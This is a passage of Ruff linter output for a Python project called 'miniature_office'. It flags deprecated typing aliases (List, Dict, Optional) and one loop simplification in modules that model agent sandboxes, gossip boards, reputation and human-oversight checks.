547 |     failures: List[str] = field(default_factory=list)
548 |     stars_earned: List[str] = field(default_factory=list)
549 |     reviews_received: List[Review] = field(default_factory=list)
    |                       ^^^^
550 |
551 |     # Usage constraints
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:638:18
    |
637 |     system_id: str
638 |     suspensions: List[CreativePrivilegeSuspension] = field(default_factory=list)
    |                  ^^^^
639 |
640 |     def suspend_creative_privileges(
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:656:53
    |
654 |         return suspension.suspension_id
655 |
656 |     def audit_interactions(self, entity_id: str) -> Dict[str, Any]:
    |                                                     ^^^^
657 |         """Audit interaction logs for an entity."""
658 |         # Would integrate with audit log system
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:725:20
    |
724 |     # Track records
725 |     track_records: Dict[str, PersonalTrackRecord] = field(default_factory=dict)
    |                    ^^^^
726 |
727 |     # State
    |
help: Replace with `dict`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:746:41
    |
744 |         return True
745 |
746 |     def verify_human_supremacy(self) -> Tuple[bool, List[str]]:
    |                                         ^^^^^
747 |         """Verify human supremacy is maintained."""
748 |         violations = []
    |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:746:53
    |
744 |         return True
745 |
746 |     def verify_human_supremacy(self) -> Tuple[bool, List[str]]:
    |                                                     ^^^^
747 |         """Verify human supremacy is maintained."""
748 |         violations = []
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\creative_autonomy.py:836:29
    |
835 | # Global instance
836 | _bounded_creative_autonomy: Optional[BoundedCreativeAutonomy] = None
    |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |
help: Convert to `X | None`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\density_codex.py:10:1
   |
 8 | from dataclasses import dataclass
 9 | from enum import Enum
10 | from typing import Dict, List
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\density_codex.py:10:1
   |
 8 | from dataclasses import dataclass
 9 | from enum import Enum
10 | from typing import Dict, List
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\density_codex.py:72:26
   |
70 |     rationale: str
71 |
72 |     def to_dict(self) -> Dict:
   |                          ^^^^
73 |         return {
74 |             "law_id": self.law_id,
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\density_codex.py:117:25
    |
116 |     @classmethod
117 |     def get_all(cls) -> List[InviolableLaw]:
    |                         ^^^^
118 |         """Get all inviolable laws"""
119 |         return [
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\density_codex.py:185:25
    |
184 |     def __init__(self):
185 |         self.relations: List[AuthorityRelation] = []
    |                         ^^^^
186 |
187 |     def add_relation(self, relation: AuthorityRelation) -> bool:
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\density_codex.py:253:24
    |
251 |     occurred_at_tick: int
252 |     caused_by: str  # Entity ID
253 |     affected_entities: List[str]
    |                        ^^^^
254 |     escalated_to: AuthorityNode
255 |     resource_cost: int  # Resources consumed by this failure
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\density_codex.py:259:26
    |
257 |     recorded: bool = True
258 |
259 |     def to_dict(self) -> Dict:
    |                          ^^^^
260 |         return {
261 |             "failure_id": self.failure_id,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\density_codex.py:343:26
    |
341 |     logged_at_tick: int
342 |
343 |     def to_dict(self) -> Dict:
    |                          ^^^^
344 |         return {
345 |             "action_id": self.action_id,
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\density_codex.py:370:24
    |
368 |         self.inviolable_laws = InviolableLaws.get_all()
369 |         self.authority_graph = AuthorityGraph()
370 |         self.failures: List[FirstClassFailure] = []
    |                        ^^^^
371 |         self.human_actions: List[HumanAction] = []
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\density_codex.py:371:29
    |
369 |         self.authority_graph = AuthorityGraph()
370 |         self.failures: List[FirstClassFailure] = []
371 |         self.human_actions: List[HumanAction] = []
    |                             ^^^^
372 |
373 |     def validate_axiom(self, axiom: PrimitiveAxiom, context: Dict) -> bool:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\density_codex.py:373:62
    |
371 |         self.human_actions: List[HumanAction] = []
372 |
373 |     def validate_axiom(self, axiom: PrimitiveAxiom, context: Dict) -> bool:
    |                                                              ^^^^
374 |         """
375 |         Validate that an axiom is being followed.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\density_codex.py:476:26
    |
474 |         )
475 |
476 |     def to_dict(self) -> Dict:
    |                          ^^^^
477 |         """Export complete codex state"""
478 |         return {
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\density_codex.py:498:46
    |
498 | def validate_civilization_tier(system_state: Dict) -> bool:
    |                                              ^^^^
499 |     """
500 |     Validate that the system is operating at civilization tier.
    |
help: Replace with `dict`

SIM110 Use `return all(codex.validate_axiom(axiom, system_state) for axiom in codex.axioms)` instead of `for` loop
   --> src\app\miniature_office\core\density_codex.py:508:5
    |
507 |       # Check all primitive axioms
508 | /     for axiom in codex.axioms:
509 | |         if not codex.validate_axiom(axiom, system_state):
510 | |             return False
511 | |
512 | |     return True
    | |_______________^
    |
help: Replace with `return all(codex.validate_axiom(axiom, system_state) for axiom in codex.axioms)`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\entity.py:10:1
   |
 8 | from datetime import datetime, timezone
 9 | from enum import Enum
10 | from typing import Any, Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\entity.py:10:1
   |
 8 | from datetime import datetime, timezone
 9 | from enum import Enum
10 | from typing import Any, Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> src\app\miniature_office\core\entity.py:10:1
   |
 8 | from datetime import datetime, timezone
 9 | from enum import Enum
10 | from typing import Any, Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\entity.py:45:15
   |
43 |     target_id: str
44 |     relation_type: RelationType
45 |     metadata: Dict[str, Any] = field(default_factory=dict)
   |               ^^^^
46 |     created_at: datetime = field(default_factory=datetime.utcnow)
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\entity.py:60:19
   |
58 |         entity_type: EntityType,
59 |         name: str,
60 |         metadata: Optional[Dict] = None,
   |                   ^^^^^^^^^^^^^^
61 |     ):
62 |         self.entity_id = entity_id or str(uuid.uuid4())
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\entity.py:60:28
   |
58 |         entity_type: EntityType,
59 |         name: str,
60 |         metadata: Optional[Dict] = None,
   |                            ^^^^
61 |     ):
62 |         self.entity_id = entity_id or str(uuid.uuid4())
   |
help: Replace with `dict`

UP017 [*] Use `datetime.UTC` alias
  --> src\app\miniature_office\core\entity.py:66:40
   |
64 |         self.name = name
65 |         self.metadata = metadata or {}
66 |         self.created_at = datetime.now(timezone.utc)
   |                                        ^^^^^^^^^^^^
67 |         self.relationships: List[Relationship] = []
   |
help: Convert to `datetime.UTC` alias

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\entity.py:67:29
   |
65 |         self.metadata = metadata or {}
66 |         self.created_at = datetime.now(timezone.utc)
67 |         self.relationships: List[Relationship] = []
   |                             ^^^^
68 |
69 |     def declare_relationship(
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\entity.py:73:19
   |
71 |         target: "Entity",
72 |         relation_type: RelationType,
73 |         metadata: Optional[Dict] = None,
   |                   ^^^^^^^^^^^^^^
74 |     ) -> Relationship:
75 |         """
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\entity.py:73:28
   |
71 |         target: "Entity",
72 |         relation_type: RelationType,
73 |         metadata: Optional[Dict] = None,
   |                            ^^^^
74 |     ) -> Relationship:
75 |         """
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\entity.py:96:30
   |
95 |     def get_relationships(
96 |         self, relation_type: Optional[RelationType] = None
   |                              ^^^^^^^^^^^^^^^^^^^^^^
97 |     ) -> List[Relationship]:
98 |         """Get all relationships, optionally filtered by type"""
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\entity.py:97:10
   |
95 |     def get_relationships(
96 |         self, relation_type: Optional[RelationType] = None
97 |     ) -> List[Relationship]:
   |          ^^^^
98 |         """Get all relationships, optionally filtered by type"""
99 |         if relation_type:
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\entity.py:103:26
    |
101 |         return self.relationships
102 |
103 |     def to_dict(self) -> Dict:
    |                          ^^^^
104 |         """Serialize entity to dictionary"""
105 |         return {
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\entity.py:129:24
    |
128 |     def __init__(self):
129 |         self.entities: Dict[str, Entity] = {}
    |                        ^^^^
130 |         self._type_index: Dict[EntityType, Set[str]] = {t: set() for t in EntityType}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\entity.py:130:27
    |
128 |     def __init__(self):
129 |         self.entities: Dict[str, Entity] = {}
130 |         self._type_index: Dict[EntityType, Set[str]] = {t: set() for t in EntityType}
    |                           ^^^^
131 |
132 |     def register(self, entity: Entity) -> None:
    |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> src\app\miniature_office\core\entity.py:130:44
    |
128 |     def __init__(self):
129 |         self.entities: Dict[str, Entity] = {}
130 |         self._type_index: Dict[EntityType, Set[str]] = {t: set() for t in EntityType}
    |                                            ^^^
131 |
132 |     def register(self, entity: Entity) -> None:
    |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\entity.py:140:38
    |
138 |         self._type_index[entity.entity_type].add(entity.entity_id)
139 |
140 |     def get(self, entity_id: str) -> Optional[Entity]:
    |                                      ^^^^^^^^^^^^^^^^
141 |         """Get an entity by ID"""
142 |         return self.entities.get(entity_id)
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\entity.py:144:55
    |
142 |         return self.entities.get(entity_id)
143 |
144 |     def get_by_type(self, entity_type: EntityType) -> List[Entity]:
    |                                                       ^^^^
145 |         """Get all entities of a specific type"""
146 |         return [self.entities[eid] for eid in self._type_index[entity_type]]
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\entity.py:184:76
    |
182 |         ) in valid_combinations
183 |
184 |     def find_related(self, entity_id: str, relation_type: RelationType) -> List[Entity]:
    |                                                                            ^^^^
185 |         """Find all entities related to a given entity by relation type"""
186 |         entity = self.get(entity_id)
    |
help: Replace with `list`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\expanded_autonomy.py:24:1
   |
22 | from datetime import datetime
23 | from enum import Enum
24 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
25 |
26 | # ============================================================================
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\expanded_autonomy.py:24:1
   |
22 | from datetime import datetime
23 | from enum import Enum
24 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
25 |
26 | # ============================================================================
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\expanded_autonomy.py:78:20
   |
77 |     # Collaboration
78 |     collaborators: List[str] = field(default_factory=list)  # Floor IDs
   |                    ^^^^
79 |     task_force_members: List[str] = field(default_factory=list)  # Agent IDs
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\expanded_autonomy.py:79:25
   |
77 |     # Collaboration
78 |     collaborators: List[str] = field(default_factory=list)  # Floor IDs
79 |     task_force_members: List[str] = field(default_factory=list)  # Agent IDs
   |                         ^^^^
80 |
81 |     # Content
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\expanded_autonomy.py:82:17
   |
81 |     # Content
82 |     code_files: Dict[str, str] = field(default_factory=dict)  # path -> content
   |                 ^^^^
83 |     test_results: List[Dict[str, Any]] = field(default_factory=list)
84 |     documentation: str = ""
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\expanded_autonomy.py:83:19
   |
81 |     # Content
82 |     code_files: Dict[str, str] = field(default_factory=dict)  # path -> content
83 |     test_results: List[Dict[str, Any]] = field(default_factory=list)
   |                   ^^^^
84 |     documentation: str = ""
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\expanded_autonomy.py:83:24
   |
81 |     # Content
82 |     code_files: Dict[str, str] = field(default_factory=dict)  # path -> content
83 |     test_results: List[Dict[str, Any]] = field(default_factory=list)
   |                        ^^^^
84 |     documentation: str = ""
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\expanded_autonomy.py:87:29
   |
86 |     # Resources (non-production)
87 |     sandbox_resources_used: Dict[str, float] = field(default_factory=dict)
   |                             ^^^^
88 |     tools_used: List[str] = field(default_factory=list)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\expanded_autonomy.py:88:17
   |
86 |     # Resources (non-production)
87 |     sandbox_resources_used: Dict[str, float] = field(default_factory=dict)
88 |     tools_used: List[str] = field(default_factory=list)
   |                 ^^^^
89 |
90 |     # Promotion
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\expanded_autonomy.py:91:37
   |
90 |     # Promotion
91 |     promotion_candidate_flagged_at: Optional[datetime] = None
   |                                     ^^^^^^^^^^^^^^^^^^
92 |     promotion_candidate_flagged_by: Optional[str] = None
93 |     promotion_reason: str = ""
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\expanded_autonomy.py:92:37
   |
90 |     # Promotion
91 |     promotion_candidate_flagged_at: Optional[datetime] = None
92 |     promotion_candidate_flagged_by: Optional[str] = None
   |                                     ^^^^^^^^^^^^^
93 |     promotion_reason: str = ""
94 |     human_decision: Optional[str] = None  # "promote", "leave", "archive", "kill"
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\expanded_autonomy.py:94:21
   |
92 |     promotion_candidate_flagged_by: Optional[str] = None
93 |     promotion_reason: str = ""
94 |     human_decision: Optional[str] = None  # "promote", "leave", "archive", "kill"
   |                     ^^^^^^^^^^^^^
95 |     promoted_to_directive_id: Optional[str] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\expanded_autonomy.py:95:31
   |
93 |     promotion_reason: str = ""
94 |     human_decision: Optional[str] = None  # "promote", "leave", "archive", "kill"
95 |     promoted_to_directive_id: Optional[str] = None
   |                               ^^^^^^^^^^^^^
96 |
97 |     # Safety
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:139:55
    |
137 |             self.collaborators.append(floor_id)
138 |
139 |     def verify_sandbox_isolation(self) -> tuple[bool, List[str]]:
    |                                                       ^^^^
140 |         """Verify sandbox is properly isolated from production."""
141 |         violations = []
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:167:16
    |
166 |     manager_id: str
167 |     sandboxes: Dict[str, SandboxBranch] = field(default_factory=dict)
    |                ^^^^
168 |
169 |     def create_sandbox(
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:184:43
    |
182 |         return branch_id
183 |
184 |     def get_promotion_candidates(self) -> List[SandboxBranch]:
    |                                           ^^^^
185 |         """Get all sandboxes flagged for promotion."""
186 |         return [
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:208:39
    |
206 |         return count
207 |
208 |     def get_active_sandboxes(self) -> List[SandboxBranch]:
    |                                       ^^^^
209 |         """Get all active sandboxes."""
210 |         return [s for s in self.sandboxes.values() if s.status == SandboxStatus.ACTIVE]
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:266:18
    |
264 |     topic: str  # e.g., "GPT-5 rumors", "Rust 2.0 features", "New GPU architecture"
265 |     speculation: str  # Brief speculation/rumor
266 |     gossiped_by: List[str]  # Agent IDs who discussed this
    |                  ^^^^
267 |     started_at: datetime = field(default_factory=datetime.now)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:270:24
    |
269 |     # Engagement
270 |     agents_interested: List[str] = field(default_factory=list)
    |                        ^^^^
271 |     sparked_debates: int = 0
272 |     water_cooler_moments: int = 0
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:313:19
    |
312 |     board_id: str
313 |     gossip_items: Dict[str, TechGossipItem] = field(default_factory=dict)
    |                   ^^^^
314 |     trending_topics: List[str] = field(default_factory=list)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:314:22
    |
312 |     board_id: str
313 |     gossip_items: Dict[str, TechGossipItem] = field(default_factory=dict)
314 |     trending_topics: List[str] = field(default_factory=list)
    |                      ^^^^
315 |
316 |     def post_gossip(
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:321:22
    |
319 |         topic: str,
320 |         speculation: str,
321 |         gossiped_by: List[str],
    |                      ^^^^
322 |     ) -> str:
323 |         """Post a new piece of tech gossip."""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:339:55
    |
337 |         return gossip_id
338 |
339 |     def get_trending_topics(self, limit: int = 10) -> List[str]:
    |                                                       ^^^^
340 |         """Get current trending gossip topics."""
341 |         return self.trending_topics[:limit]
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:345:10
    |
343 |     def get_gossip_by_category(
344 |         self, category: TechGossipCategory
345 |     ) -> List[TechGossipItem]:
    |          ^^^^
346 |         """Get all gossip in a category."""
347 |         return [g for g in self.gossip_items.values() if g.category == category]
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:349:36
    |
347 |         return [g for g in self.gossip_items.values() if g.category == category]
348 |
349 |     def get_hot_ai_gossip(self) -> List[TechGossipItem]:
    |                                    ^^^^
350 |         """Get all AI-related gossip (usually the hottest topic)."""
351 |         return self.get_gossip_by_category(TechGossipCategory.AI_DEVELOPMENTS)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:408:19
    |
407 |     conversation_id: str
408 |     participants: List[str]  # Agent IDs
    |                   ^^^^
409 |     themes: List[ConversationTheme]
410 |     started_at: datetime = field(default_factory=datetime.now)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:409:13
    |
407 |     conversation_id: str
408 |     participants: List[str]  # Agent IDs
409 |     themes: List[ConversationTheme]
    |             ^^^^
410 |     started_at: datetime = field(default_factory=datetime.now)
411 |     ended_at: Optional[datetime] = None
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\expanded_autonomy.py:411:15
    |
409 |     themes: List[ConversationTheme]
410 |     started_at: datetime = field(default_factory=datetime.now)
411 |     ended_at: Optional[datetime] = None
    |               ^^^^^^^^^^^^^^^^^^
412 |
413 |     # Relaxed logging - themes only, not content
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:414:27
    |
413 |     # Relaxed logging - themes only, not content
414 |     emergent_initiatives: List[str] = field(default_factory=list)  # Titles only
    |                           ^^^^
415 |     sparked_sandboxes: List[str] = field(default_factory=list)  # Sandbox IDs
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:415:24
    |
413 |     # Relaxed logging - themes only, not content
414 |     emergent_initiatives: List[str] = field(default_factory=list)  # Titles only
415 |     sparked_sandboxes: List[str] = field(default_factory=list)  # Sandbox IDs
    |                        ^^^^
416 |
417 |     # Explicitly NOT logged
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:453:20
    |
451 |     """
452 |
453 |     conversations: Dict[str, LoungeConversation] = field(default_factory=dict)
    |                    ^^^^
454 |     lounge_to_sandbox_transitions: List[Dict[str, Any]] = field(default_factory=list)
455 |     lounge_to_production_blocks: List[Dict[str, Any]] = field(default_factory=list)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:454:36
    |
453 |     conversations: Dict[str, LoungeConversation] = field(default_factory=dict)
454 |     lounge_to_sandbox_transitions: List[Dict[str, Any]] = field(default_factory=list)
    |                                    ^^^^
455 |     lounge_to_production_blocks: List[Dict[str, Any]] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:454:41
    |
453 |     conversations: Dict[str, LoungeConversation] = field(default_factory=dict)
454 |     lounge_to_sandbox_transitions: List[Dict[str, Any]] = field(default_factory=list)
    |                                         ^^^^
455 |     lounge_to_production_blocks: List[Dict[str, Any]] = field(default_factory=list)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:455:34
    |
453 |     conversations: Dict[str, LoungeConversation] = field(default_factory=dict)
454 |     lounge_to_sandbox_transitions: List[Dict[str, Any]] = field(default_factory=list)
455 |     lounge_to_production_blocks: List[Dict[str, Any]] = field(default_factory=list)
    |                                  ^^^^
456 |
457 |     # Tech Gossip Board (pure culture)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:455:39
    |
453 |     conversations: Dict[str, LoungeConversation] = field(default_factory=dict)
454 |     lounge_to_sandbox_transitions: List[Dict[str, Any]] = field(default_factory=list)
455 |     lounge_to_production_blocks: List[Dict[str, Any]] = field(default_factory=list)
    |                                       ^^^^
456 |
457 |     # Tech Gossip Board (pure culture)
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\expanded_autonomy.py:458:24
    |
457 |     # Tech Gossip Board (pure culture)
458 |     tech_gossip_board: Optional[TechGossipBoard] = None
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^
459 |
460 |     def __post_init__(self):
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:466:29
    |
465 |     def start_conversation(
466 |         self, participants: List[str], themes: List[ConversationTheme]
    |                             ^^^^
467 |     ) -> str:
468 |         """Start a new lounge conversation."""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:466:48
    |
465 |     def start_conversation(
466 |         self, participants: List[str], themes: List[ConversationTheme]
    |                                                ^^^^
467 |     ) -> str:
468 |         """Start a new lounge conversation."""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:513:22
    |
511 |         topic: str,
512 |         speculation: str,
513 |         gossiped_by: List[str],
    |                      ^^^^
514 |     ) -> str:
515 |         """Post tech gossip to the board (pure water cooler talk)."""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:528:36
    |
526 |         return "No gossip board available."
527 |
528 |     def get_hot_ai_gossip(self) -> List[TechGossipItem]:
    |                                    ^^^^
529 |         """Get all the hot AI gossip (usually the most popular)."""
530 |         if self.tech_gossip_board:
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:534:60
    |
532 |         return []
533 |
534 |     def get_trending_tech_topics(self, limit: int = 10) -> List[str]:
    |                                                            ^^^^
535 |         """Get trending tech topics in the office."""
536 |         if self.tech_gossip_board:
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:630:59
    |
628 |         self.trust_score = max(0.0, self.trust_score - 0.05)
629 |
630 |     def verify_credibility_not_power(self) -> tuple[bool, List[str]]:
    |                                                           ^^^^
631 |         """Verify reputation grants credibility, not power."""
632 |         violations = []
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:659:18
    |
658 |     system_id: str
659 |     reputations: Dict[str, ReputationInfluence] = field(default_factory=dict)
    |                  ^^^^
660 |
661 |     def get_or_create_reputation(self, agent_id: str) -> ReputationInfluence:
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:712:20
    |
710 |     # New features
711 |     presentation_title: str = ""
712 |     sandbox_demos: List[str] = field(default_factory=list)  # Sandbox IDs
    |                    ^^^^
713 |     cultural_story: str = ""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:724:54
    |
722 |         self.sandbox_demos.append(sandbox_id)
723 |
724 |     def verify_no_power_granted(self) -> tuple[bool, List[str]]:
    |                                                      ^^^^
725 |         """Verify spotlight grants no power."""
726 |         violations = []
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:760:23
    |
759 |     guarantee_id: str
760 |     rollback_history: List[Dict[str, Any]] = field(default_factory=list)
    |                       ^^^^
761 |     autonomy_locked: bool = False
762 |     lock_reason: Optional[str] = None
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:760:28
    |
759 |     guarantee_id: str
760 |     rollback_history: List[Dict[str, Any]] = field(default_factory=list)
    |                            ^^^^
761 |     autonomy_locked: bool = False
762 |     lock_reason: Optional[str] = None
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\expanded_autonomy.py:762:18
    |
760 |     rollback_history: List[Dict[str, Any]] = field(default_factory=list)
761 |     autonomy_locked: bool = False
762 |     lock_reason: Optional[str] = None
    |                  ^^^^^^^^^^^^^
763 |
764 |     def execute_full_rollback(
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:770:10
    |
768 |         sandbox_manager: SandboxManager,
769 |         reputation_system: ReputationSystem,
770 |     ) -> Dict[str, int]:
    |          ^^^^
771 |         """Execute complete rollback of all autonomous features."""
772 |         result = {
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:848:26
    |
847 |     # Employee of the Month (upgraded)
848 |     employee_spotlights: List[EmployeeSpotlight] = field(default_factory=list)
    |                          ^^^^
849 |
850 |     # Safety tracking
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\expanded_autonomy.py:906:53
    |
904 |                 pass
905 |
906 |     def verify_human_supremacy(self) -> tuple[bool, List[str]]:
